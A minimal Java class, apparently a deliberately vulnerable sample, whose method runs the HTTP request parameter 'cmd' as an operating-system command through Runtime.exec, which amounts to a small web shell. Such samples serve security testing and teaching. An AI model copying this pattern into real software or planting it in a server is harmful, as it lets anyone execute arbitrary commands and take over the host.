import javax.servlet.http.HttpServletRequest;

public class RuntimeExecServlet {
    public void run(HttpServletRequest req) throws Exception {
        Runtime.getRuntime().exec(req.getParameter("cmd"));
    }
}
